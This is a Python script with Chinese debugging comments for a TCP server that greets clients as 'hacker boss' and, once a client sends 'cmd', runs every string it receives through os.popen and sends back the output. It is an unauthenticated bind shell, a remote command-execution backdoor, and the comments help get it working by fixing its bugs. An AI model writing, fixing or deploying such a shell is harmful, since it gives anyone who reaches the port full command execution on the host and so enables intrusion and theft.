import os
import socket


def main():
    # 初始化
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # 【BUG1】gethostname() 没加括号！返回的是函数对象，不是字符串！！！
    # 正确写法：
    host = socket.gethostname()  # ← 加上括号！！！
    port = 12345

    # 【BUG2】如果本机 hostname 解析不到 IP（常见于某些笔记本），bind 会失败
    # 保险起见很多人都直接写 '0.0.0.0' 或 ''，但你现在先修括号就行
    s.bind((host, port))
    s.listen(5)
    print(f"服务器启动，监听 {host}:{port}")

    while True:
        c, addr = s.accept()
        print("连接的地址是：", addr)
        c.send("欢迎黑客大佬\r\n".encode("utf-8"))  # 加个换行看着舒服点

        while True:
            try:
                # 第一次收客户端发来的数据（期望是 "cmd"）
                recv_data = c.recv(1024).decode("utf-8").strip()  # ← 加 strip() 去掉可能的 \r\n
                print("收到:", repr(recv_data))

                if recv_data == 'cmd':
                    c.send("ok,cmd start\r\n".encode("utf-8"))
                    while True:
                        # 【BUG3 - 最严重！】这里用 c.recv(1024) 直接收，但没判断是否为空！
                        # 客户端 close() 后这里会一直返回 b''，导致死循环+卡死
                        data = c.recv(1024)
                        if not data:  # ← 关键修复：客户端断开时 data == b''
                            print("客户端主动断开")
                            break

                        recv_data2 = data.decode("utf-8", errors="ignore").strip()


                        if recv_data2 == 'exit':
                            c.send("ok,cmd stop\r\n".encode("utf-8"))
                            break
                        elif recv_data2 == '':  # 防止空命令也执行
                            continue
                        else:
                            # 【BUG4】os.popen 在 Windows 下返回的字符串结尾会有 \r\n，Linux 也可能有奇怪换行
                            # 而且超大输出会截断（只读 一次 read()）
                            # 这里先用 read()，后面你如果要优化再改 subprocess
                            x = os.popen(recv_data2).read()  # ← 目前能跑
                            if not x:  # 命令没输出时也得发点东西，防止客户端卡
                                x = "Executed, no output.\r\n"
                            c.send(x.encode("utf-8"))
                else:
                    # 回显功能（非 cmd 模式）
                    c.send(recv_data.encode("utf-8") + b"\r\n")

            except ConnectionResetError:  # Windows 常见
                print("连接被对方重置")
                break
            except Exception as e:
                print("断开连接", e)
                break

        c.close()  # 每次客户端断开都要 close
    # s.close()  # 主循环永不退出，其实永远到不了这里，写不写都行


if __name__ == '__main__':
    main()